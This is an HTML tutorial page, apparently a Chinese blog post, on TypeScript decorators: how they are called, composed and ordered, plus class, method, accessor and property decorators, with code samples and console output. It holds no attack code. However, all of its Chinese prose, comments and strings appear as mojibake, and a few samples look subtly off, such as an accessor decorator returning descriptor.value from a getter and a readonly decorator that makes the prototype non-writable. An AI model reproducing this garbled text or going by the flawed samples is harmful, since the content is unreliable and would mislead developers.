<p>å®šä¹‰ï¼šåœ¨ä¸ä¿®æ”¹åŸä»£ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ³¨è§£æ–¹å¼ä¸ºç±»ã€æ–¹æ³•ã€å±æ€§æˆ–å‚æ•°æ·»åŠ é¢å¤–åŠŸèƒ½çš„ç‰¹æ€§</p>
</blockquote>
<h3 data-id="heading-1">1.1è°ƒç”¨æ–¹å¼</h3>
<p>ä»¥<code>@expression</code>è¿™ç§å½¢å¼ï¼Œ<code>expression</code>æ±‚å€¼åå¿…é¡»ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œåœ¨è¢«è°ƒç”¨æ—¶ä¼šè°ƒç”¨è¡¨è¾¾å¼è¡¨ç¤ºçš„å‡½æ•°</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">firstDec</span> (){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'firstDec'</span>)
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">secondDec</span> (){
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'secondDec'</span>)
    }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter</span> {
    @firstDec
    <span class="hljs-title function_">firstGreet</span>(<span class="hljs-params">name: string</span>) {
    }
    @<span class="hljs-title function_">secondDec</span>()
    <span class="hljs-title function_">secondGreet</span>(<span class="hljs-params">name: string</span>) {
    }
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeter</span>()
<span class="hljs-comment">//firstDec</span>
<span class="hljs-comment">//secondDec</span>
</code></pre>
<h3 data-id="heading-2">1.2è£…é¥°å™¨ç»„åˆ</h3>
<p>å¤šä¸ªè£…é¥°å™¨å¯ä»¥åŒæ—¶åº”ç”¨åˆ°ä¸€ä¸ªå£°æ˜ä¸Šï¼Œå¤šè£…é¥°å™¨ä½¿ç”¨éµå¾ªä»¥ä¸‹è§„åˆ™</p>
<ol>
<li>ç”±ä¸Šè‡³ä¸‹ä¾æ¬¡å¯¹è£…é¥°å™¨è¡¨è¾¾å¼æ±‚å€¼ã€‚</li>
<li>æ±‚å€¼çš„ç»“æœä¼šè¢«å½“ä½œå‡½æ•°ï¼Œç”±ä¸‹è‡³ä¸Šä¾æ¬¡è°ƒç”¨ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¹¦å†™åœ¨åŒä¸€è¡Œä¸Š</span>
@f @g x

<span class="hljs-comment">// å¤šè¡Œä½¿ç”¨</span>
@f
@g
x
</code></pre>
<h2 data-id="heading-3">2ã€è£…é¥°å™¨å·¥å‚</h2>
<p>è£…é¥°å™¨å·¥å‚ä¸»è¦çš„åº”ç”¨åœºæ™¯å°±æ˜¯è®©è£…é¥°å™¨æ¥æ”¶é…ç½®å‚æ•°ï¼Œå®ç°åŠ¨æ€ç”Ÿæˆè¿”å›ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">color</span>(<span class="hljs-params">value: string</span>) { <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªè£…é¥°å™¨å·¥å‚</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">target</span>) { <span class="hljs-comment">//  è¿™æ˜¯è£…é¥°å™¨</span>
        <span class="hljs-comment">// do something with "target" and "value"...</span>
    }
}
</code></pre>
<h2 data-id="heading-4">3ã€è£…é¥°å™¨æ‰§è¡Œé¡ºåº</h2>
<ol>
<li>å‚æ•°è£…é¥°å™¨ä¼šåœ¨æ–¹æ³•è£…é¥°å™¨ä¹‹å‰æ‰§è¡Œï¼Œç„¶åæ–¹æ³•è£…é¥°å™¨ï¼Œè®¿é—®ç¬¦è£…é¥°å™¨ï¼Œæˆ–å±æ€§è£…é¥°å™¨æŒ‰ä¹¦å†™é¡ºåºæ‰§è¡Œï¼Œæœ€ååº”ç”¨åˆ°æ¯ä¸ªå®ä¾‹æˆå‘˜ã€‚</li>
<li>å‚æ•°è£…é¥°å™¨ä¼šåœ¨æ–¹æ³•è£…é¥°å™¨ä¹‹å‰æ‰§è¡Œï¼Œç„¶åæ–¹æ³•è£…é¥°å™¨ï¼Œè®¿é—®ç¬¦è£…é¥°å™¨ï¼Œæˆ–å±æ€§è£…é¥°å™¨æŒ‰ä¹¦å†™é¡ºåºæ‰§è¡Œï¼Œæœ€ååº”ç”¨åˆ°æ¯ä¸ªé™æ€æˆå‘˜ã€‚</li>
<li>å‚æ•°è£…é¥°å™¨åº”ç”¨åˆ°æ„é€ å‡½æ•°ã€‚</li>
<li>ç±»è£…é¥°å™¨åº”ç”¨åˆ°ç±»ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ParamDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol | <span class="hljs-literal">undefined</span>, parameterIndex: number</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: <span class="hljs-subst">${target?.constructor?.name || <span class="hljs-string">'æ„é€ å‡½æ•°'</span>}</span>, å±æ€§: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey || <span class="hljs-string">'constructor'</span>)}</span>, å‚æ•°ç´¢å¼•: <span class="hljs-subst">${parameterIndex}</span>`</span>);
}

<span class="hljs-comment">// æ–¹æ³•è£…é¥°å™¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">MethodDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[æ–¹æ³•è£…é¥°å™¨] ç›®æ ‡: <span class="hljs-subst">${target.constructor.name}</span>, æ–¹æ³•: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
    <span class="hljs-keyword">return</span> descriptor;
}

<span class="hljs-comment">// è®¿é—®ç¬¦è£…é¥°å™¨ï¼ˆgetter/setterï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">AccessorDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[è®¿é—®ç¬¦è£…é¥°å™¨] ç›®æ ‡: <span class="hljs-subst">${target.constructor.name}</span>, è®¿é—®ç¬¦: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
    <span class="hljs-keyword">return</span> descriptor;
}

<span class="hljs-comment">// å±æ€§è£…é¥°å™¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PropertyDecorator</span>(<span class="hljs-params">target: any, propertyKey: string | symbol</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[å±æ€§è£…é¥°å™¨] ç›®æ ‡: <span class="hljs-subst">${target.constructor.name}</span>, å±æ€§: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
}

<span class="hljs-comment">// ç±»è£…é¥°å™¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ClassDecorator</span>(<span class="hljs-params">constructor: <span class="hljs-built_in">Function</span></span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[ç±»è£…é¥°å™¨] ç±»å: <span class="hljs-subst">${constructor.name}</span>`</span>);
}

@<span class="hljs-title class_">ClassDecorator</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-comment">// å®ä¾‹æ–¹æ³•ï¼ˆå¸¦å‚æ•°è£…é¥°å™¨ï¼‰</span>
    @<span class="hljs-title class_">MethodDecorator</span>
    <span class="hljs-title function_">instanceMethod</span>(<span class="hljs-params">
        @ParamDecorator param1: string,
        @ParamDecorator param2: number
    </span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‰§è¡Œå®ä¾‹æ–¹æ³•'</span>);
    }
    
    <span class="hljs-comment">// å®ä¾‹å±æ€§</span>
    @<span class="hljs-title class_">PropertyDecorator</span>
    <span class="hljs-attr">instanceProperty</span>: string = <span class="hljs-string">'å®ä¾‹å±æ€§'</span>;
    
    
    <span class="hljs-comment">// å®ä¾‹è®¿é—®ç¬¦ï¼ˆgetterï¼‰</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">instanceAccessor</span>(): string {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceProperty</span>;
    }

    <span class="hljs-comment">// å®ä¾‹è®¿é—®ç¬¦ï¼ˆsetterï¼‰</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">set</span> <span class="hljs-title function_">instanceAccessor</span>(<span class="hljs-params">value: string</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceProperty</span> = value;
    }

    <span class="hljs-comment">// é™æ€å±æ€§</span>
    @<span class="hljs-title class_">PropertyDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-attr">staticProperty</span>: string = <span class="hljs-string">'é™æ€å±æ€§'</span>;

    <span class="hljs-comment">// é™æ€æ–¹æ³•ï¼ˆå¸¦å‚æ•°è£…é¥°å™¨ï¼‰</span>
    @<span class="hljs-title class_">MethodDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params">
        @ParamDecorator param1: string,
        @ParamDecorator param2: number
    </span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‰§è¡Œé™æ€æ–¹æ³•'</span>);
    }

    <span class="hljs-comment">// é™æ€è®¿é—®ç¬¦ï¼ˆgetterï¼‰</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">get</span> <span class="hljs-title function_">staticAccessor</span>(): string {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Example</span>.<span class="hljs-property">staticProperty</span>;
    }

    <span class="hljs-comment">// é™æ€è®¿é—®ç¬¦ï¼ˆsetterï¼‰</span>
    @<span class="hljs-title class_">AccessorDecorator</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">set</span> <span class="hljs-title function_">staticAccessor</span>(<span class="hljs-params">value: string</span>) {
        <span class="hljs-title class_">Example</span>.<span class="hljs-property">staticProperty</span> = value;
    }

    <span class="hljs-comment">// æ„é€ å‡½æ•°ï¼ˆå¸¦å‚æ•°è£…é¥°å™¨ï¼‰</span>
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
        @ParamDecorator param1: string,
        @ParamDecorator param2: number
    </span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ„é€ å‡½æ•°æ‰§è¡Œ'</span>);
    }
}

<span class="hljs-keyword">const</span> example = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(<span class="hljs-string">'test'</span>, <span class="hljs-number">123</span>);
<span class="hljs-comment">//[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: Example, å±æ€§: instanceMethod, å‚æ•°ç´¢å¼•: 1</span>
<span class="hljs-comment">//[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: Example, å±æ€§: instanceMethod, å‚æ•°ç´¢å¼•: 0</span>
<span class="hljs-comment">//[æ–¹æ³•è£…é¥°å™¨] ç›®æ ‡: Example, æ–¹æ³•: instanceMethod</span>
<span class="hljs-comment">//[å±æ€§è£…é¥°å™¨] ç›®æ ‡: Example, å±æ€§: instanceProperty</span>
<span class="hljs-comment">//[è®¿é—®ç¬¦è£…é¥°å™¨] ç›®æ ‡: Example, è®¿é—®ç¬¦: instanceAccessor</span>
<span class="hljs-comment">//[è®¿é—®ç¬¦è£…é¥°å™¨] ç›®æ ‡: Example, è®¿é—®ç¬¦: instanceAccessor</span>
<span class="hljs-comment">//[å±æ€§è£…é¥°å™¨] ç›®æ ‡: Function, å±æ€§: staticProperty</span>
<span class="hljs-comment">//[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: Function, å±æ€§: staticMethod, å‚æ•°ç´¢å¼•: 1</span>
<span class="hljs-comment">//[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: Function, å±æ€§: staticMethod, å‚æ•°ç´¢å¼•: 0</span>
<span class="hljs-comment">//[æ–¹æ³•è£…é¥°å™¨] ç›®æ ‡: Function, æ–¹æ³•: staticMethod</span>
<span class="hljs-comment">//[è®¿é—®ç¬¦è£…é¥°å™¨] ç›®æ ‡: Function, è®¿é—®ç¬¦: staticAccessor</span>
<span class="hljs-comment">//[è®¿é—®ç¬¦è£…é¥°å™¨] ç›®æ ‡: Function, è®¿é—®ç¬¦: staticAccessor</span>
<span class="hljs-comment">//[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: Function, å±æ€§: constructor, å‚æ•°ç´¢å¼•: 1</span>
<span class="hljs-comment">//[å‚æ•°è£…é¥°å™¨] ç›®æ ‡: Function, å±æ€§: constructor, å‚æ•°ç´¢å¼•: 0</span>
<span class="hljs-comment">//[ç±»è£…é¥°å™¨] ç±»å: Example</span>
<span class="hljs-comment">//æ„é€ å‡½æ•°æ‰§è¡Œ</span>
</code></pre>
<h2 data-id="heading-5">4ã€è£…é¥°å™¨åˆ†ç±»</h2>
<h3 data-id="heading-6">4.1ç±»è£…é¥°å™¨</h3>
<p>ç±»è£…é¥°å™¨åœ¨ç±»å£°æ˜ä¹‹å‰è¢«å£°æ˜ï¼ˆç´§é ç€ç±»å£°æ˜ï¼‰ã€‚ ç±»è£…é¥°å™¨åº”ç”¨äºç±»æ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥ç›‘è§†ï¼Œä¿®æ”¹æˆ–æ›¿æ¢ç±»å®šä¹‰ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sealed</span>(<span class="hljs-params">constructor: <span class="hljs-built_in">Function</span></span>) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">seal</span>(constructor);
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">seal</span>(constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
}
@sealed
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter</span> {
    <span class="hljs-attr">greeting</span>: string;
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">message: string</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">greeting</span> = message;
    }
    <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello, "</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">greeting</span>;
    }
}
</code></pre>
<p>ç±»è£…é¥°å™¨è¡¨è¾¾å¼ä¼šåœ¨è¿è¡Œæ—¶å½“ä½œå‡½æ•°ç›´æ¥è°ƒç”¨ï¼Œç±»çš„æ„é€ å‡½æ•°ä½œä¸ºå…¶å”¯ä¸€çš„å‚æ•°ã€‚
å¦‚æœè£…é¥°å™¨æ‰§è¡Œæœ‰è¿”å›ï¼Œä¸”æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œåˆ™ä¼šç”¨è¿™ä¸ªå‡½æ•°æ›¿æ¢æ„é€ å‡½æ•°ï¼Œè¿”å›å…¶ä»–ç±»å‹å€¼ä¼šç›´æ¥æŠ¥é”™</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">firstDec</span> (){
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">secondDec</span> (){
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span> (){
    }
}

@firstDec
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter1</span> {
}

@secondDec
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeter2</span>{
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeter1</span>())
<span class="hljs-comment">//Greeter1 {}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeter2</span>())
<span class="hljs-comment">//Test {}</span>
</code></pre>
<h3 data-id="heading-7">4.2æ–¹æ³•è£…é¥°å™¨</h3>
<p>æ–¹æ³•è£…é¥°å™¨å£°æ˜åœ¨ä¸€ä¸ªæ–¹æ³•çš„å£°æ˜ä¹‹å‰ï¼ˆç´§é ç€æ–¹æ³•å£°æ˜ï¼‰ã€‚ å®ƒä¼šè¢«åº”ç”¨åˆ°æ–¹æ³•çš„ å±æ€§æè¿°ç¬¦ä¸Šï¼Œå¯ä»¥ç”¨æ¥ç›‘è§†ï¼Œä¿®æ”¹æˆ–è€…æ›¿æ¢æ–¹æ³•å®šä¹‰ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ReplaceMethod</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[æ›¿æ¢è£…é¥°å™¨] æ›¿æ¢æ–¹æ³•: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);

    <span class="hljs-comment">// è¿”å›ä¸€ä¸ªæ–°çš„æ–¹æ³•å®ç°</span>
    <span class="hljs-keyword">return</span> {
        ...descriptor,
        <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">...args: any[]</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ–¹æ³• <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span> å·²è¢«æ›¿æ¢ï¼`</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åŸå§‹å‚æ•°:`</span>, args);
            <span class="hljs-keyword">return</span> <span class="hljs-string">`æ›¿æ¢åçš„è¿”å›å€¼ - å‚æ•°: <span class="hljs-subst">${args.join(<span class="hljs-string">', '</span>)}</span>`</span>;
        }
    };
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example1</span> {
    @<span class="hljs-title class_">ReplaceMethod</span>
    <span class="hljs-title function_">originalMethod</span>(<span class="hljs-attr">name</span>: string, <span class="hljs-attr">age</span>: number): string {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`åŸå§‹æ–¹æ³•: <span class="hljs-subst">${name}</span>, <span class="hljs-subst">${age}</span>`</span>;
    }
}

<span class="hljs-keyword">const</span> ex1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example1</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex1.<span class="hljs-title function_">originalMethod</span>(<span class="hljs-string">'å¼ ä¸‰'</span>, <span class="hljs-number">25</span>));
<span class="hljs-comment">// è¾“å‡º: æ–¹æ³• originalMethod å·²è¢«æ›¿æ¢ï¼</span>
<span class="hljs-comment">//      åŸå§‹å‚æ•°: [ 'å¼ ä¸‰', 25 ]</span>
<span class="hljs-comment">//      æ›¿æ¢åçš„è¿”å›å€¼ - å‚æ•°: å¼ ä¸‰, 25</span>
</code></pre>
<p>æ–¹æ³•è£…é¥°å™¨è¡¨è¾¾å¼ä¼šåœ¨è¿è¡Œæ—¶å½“ä½œå‡½æ•°è¢«è°ƒç”¨ï¼Œä¼ å…¥ä¸‹åˆ—3ä¸ªå‚æ•°ï¼š</p>
<ol>
<li>å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ˜¯ç±»çš„åŸå‹å¯¹è±¡ã€‚</li>
<li>æˆå‘˜çš„åå­—ã€‚</li>
<li>æˆå‘˜çš„å±æ€§æè¿°ç¬¦ã€‚</li>
</ol>
<blockquote>
<p>æ³¨æ„â€ƒ å¦‚æœä»£ç è¾“å‡ºç›®æ ‡ç‰ˆæœ¬å°äº<code>ES5</code>ï¼Œ<em>Property Descriptor</em>å°†ä¼šæ˜¯<code>undefined</code>ã€‚</p>
</blockquote>
<p>æœ‰æ—¶ä½ å¯ä»¥ç”¨ä¸€äº›å…¶ä»–çš„æŠ€å·§ï¼Œæ¥å¯¹åŸæ–¹æ³•è¿›è¡Œæ‰©å±•</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LogMethod</span>(<span class="hljs-params">target: any, propertyKey: string | symbol, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-keyword">const</span> originalMethod = descriptor.<span class="hljs-property">value</span>; <span class="hljs-comment">// ä¿å­˜åŸå§‹æ–¹æ³•</span>

    <span class="hljs-comment">// è¿”å›åŒ…è£…åçš„æ–¹æ³•</span>
    <span class="hljs-keyword">return</span> {
        ...descriptor,
        <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">...args: any[]</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[æ—¥å¿—] è°ƒç”¨æ–¹æ³•: <span class="hljs-subst">${<span class="hljs-built_in">String</span>(propertyKey)}</span>`</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[æ—¥å¿—] å‚æ•°:`</span>, args);

            <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
            <span class="hljs-keyword">const</span> result = originalMethod.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); <span class="hljs-comment">// è°ƒç”¨åŸå§‹æ–¹æ³•</span>
            <span class="hljs-keyword">const</span> endTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[æ—¥å¿—] è¿”å›å€¼:`</span>, result);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[æ—¥å¿—] æ‰§è¡Œæ—¶é—´: <span class="hljs-subst">${endTime - startTime}</span>ms`</span>);

            <span class="hljs-keyword">return</span> result;
        }
    };
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example2</span> {
    @<span class="hljs-title class_">LogMethod</span>
    <span class="hljs-title function_">calculate</span>(<span class="hljs-attr">a</span>: number, <span class="hljs-attr">b</span>: number): number {
        <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            sum += i;
        }
        <span class="hljs-keyword">return</span> a + b;
    }
}

<span class="hljs-keyword">const</span> ex2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example2</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex2.<span class="hljs-title function_">calculate</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>));
</code></pre>
<h3 data-id="heading-8">4.3è®¿é—®è£…é¥°å™¨</h3>
<p>è®¿é—®å™¨è£…é¥°å™¨å£°æ˜åœ¨ä¸€ä¸ªè®¿é—®å™¨çš„å£°æ˜ä¹‹å‰ï¼ˆç´§é ç€è®¿é—®å™¨å£°æ˜ï¼‰ã€‚ è®¿é—®å™¨è£…é¥°å™¨åº”ç”¨äºè®¿é—®å™¨çš„ å±æ€§æè¿°ç¬¦å¹¶ä¸”å¯ä»¥ç”¨æ¥ç›‘è§†ï¼Œä¿®æ”¹æˆ–æ›¿æ¢ä¸€ä¸ªè®¿é—®å™¨çš„å®šä¹‰ã€‚</p>
<p>æ–¹æ³•è£…é¥°å™¨è¡¨è¾¾å¼ä¼šåœ¨è¿è¡Œæ—¶å½“ä½œå‡½æ•°è¢«è°ƒç”¨ï¼Œä¼ å…¥ä¸‹åˆ—3ä¸ªå‚æ•°ï¼š</p>
<ol>
<li>å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ˜¯ç±»çš„åŸå‹å¯¹è±¡ã€‚</li>
<li>æˆå‘˜çš„åå­—ã€‚</li>
<li>æˆå‘˜çš„å±æ€§æè¿°ç¬¦ã€‚</li>
</ol>
<blockquote>
<p>æ³¨æ„â€ƒ å¦‚æœä»£ç è¾“å‡ºç›®æ ‡ç‰ˆæœ¬å°äº<code>ES5</code>ï¼Œ<em>Property Descriptor</em>å°†ä¼šæ˜¯<code>undefined</code>ã€‚</p>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logAccess</span>(<span class="hljs-params">target: any, propertyKey: string, descriptor: PropertyDescriptor</span>) {
    <span class="hljs-keyword">const</span> originalGet = descriptor.<span class="hljs-property">get</span>;
    <span class="hljs-keyword">const</span> originalSet = descriptor.<span class="hljs-property">set</span>;

    <span class="hljs-keyword">if</span> (originalGet) {
        descriptor.<span class="hljs-property">get</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¿é—® getter: <span class="hljs-subst">${propertyKey}</span>`</span>);
            <span class="hljs-keyword">return</span> descriptor.<span class="hljs-property">value</span>;
        };
    }

    <span class="hljs-keyword">if</span> (originalSet) {
        descriptor.<span class="hljs-property">set</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">value: any</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¿é—® setter: <span class="hljs-subst">${propertyKey}</span>, å€¼: <span class="hljs-subst">${value}</span>`</span>);
            descriptor.<span class="hljs-property">value</span> = value;
        };
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {

    <span class="hljs-keyword">set</span> <span class="hljs-title function_">val</span>(<span class="hljs-params">value: string</span>) {
    }

    @logAccess
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">val</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span>
    }
}

<span class="hljs-keyword">const</span> ex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();
ex.<span class="hljs-property">val</span> = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex.<span class="hljs-property">val</span>);
<span class="hljs-comment">//è®¿é—® setter: val, å€¼: hello</span>
<span class="hljs-comment">//è®¿é—® getter: val</span>
<span class="hljs-comment">//hello</span>
</code></pre>
<h3 data-id="heading-9">4.4å±æ€§è£…é¥°å™¨</h3>
<p>å±æ€§è£…é¥°å™¨å£°æ˜åœ¨ä¸€ä¸ªå±æ€§å£°æ˜ä¹‹å‰ï¼ˆç´§é ç€å±æ€§å£°æ˜ï¼‰ã€‚ å±æ€§è£…é¥°å™¨ä¸èƒ½ç”¨åœ¨å£°æ˜æ–‡ä»¶ä¸­ï¼ˆ.d.tsï¼‰ï¼Œæˆ–è€…ä»»ä½•å¤–éƒ¨ä¸Šä¸‹æ–‡ï¼ˆæ¯”å¦‚ declareçš„ç±»ï¼‰é‡Œã€‚</p>
<p>å±æ€§è£…é¥°å™¨è¡¨è¾¾å¼ä¼šåœ¨è¿è¡Œæ—¶å½“ä½œå‡½æ•°è¢«è°ƒç”¨ï¼Œä¼ å…¥ä¸‹åˆ—2ä¸ªå‚æ•°ï¼š</p>
<ol>
<li>å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ˜¯ç±»çš„åŸå‹å¯¹è±¡ã€‚</li>
<li>æˆå‘˜çš„åå­—ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å±æ€§è£…é¥°å™¨ï¼šæ ‡è®°å±æ€§ä¸ºåªè¯»</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">readonly</span>(<span class="hljs-params">target: any, propertyKey: string</span>) {
    <span class="hljs-keyword">const</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(target, propertyKey) || {};
    descriptor.<span class="hljs-property">writable</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, propertyKey, descriptor);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    @readonly
    <span class="hljs-attr">name</span>: string = <span class="hljs-string">'å¼ ä¸‰'</span>;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>); <span class="hljs-comment">// å¼ ä¸‰</span>
<span class="hljs-comment">// user.name = 'æå››'; // é”™è¯¯ï¼šæ— æ³•èµ‹å€¼ç»™åªè¯»å±æ€§</span>
</code></pre>
